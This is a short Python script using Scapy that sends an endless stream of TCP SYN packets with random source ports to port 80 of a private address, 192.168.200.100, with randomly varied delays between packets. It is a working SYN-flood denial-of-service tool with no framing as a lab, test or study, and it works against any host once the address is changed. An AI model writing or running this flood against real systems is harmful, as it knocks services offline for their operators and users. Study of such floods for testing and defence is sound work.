#!/usr/bin/python3

from scapy.all import *
import time
import random

# Set the target IP and port
target_ip = "192.168.200.100"
target_port = 80

# Create an IP packet with the target IP as the destination
ip = IP(dst=target_ip)

# Define a list of random ranges
random_ranges = [(0, 0.002),(0.001, 0.004),(0, 0.01),(0.005, 0.02),(0.01, 0.04),(0.02, 0.05),(0.04, 0.06), (0.05, 0.08),(0.07, 0.1)]

while True:
    # Get current time since start
    start_time = time.time()
    duration_seconds = 1  
    # Randomly select range from list 
    rand_range=random.choice(random_ranges)
    
    while True:
        # Check if duration has passed 
        if (time.time() - start_time) > duration_seconds:
            break
    
        # Create TCP SYN packet with target port as destination port 
        SYN=TCP(sport=RandShort(), dport=target_port, flags="S", seq=42)
        # Send SYN packet 
        send(ip/SYN)
        # Wait for rand amount before sending next packet 
        time.sleep(random.uniform(*rand_range))
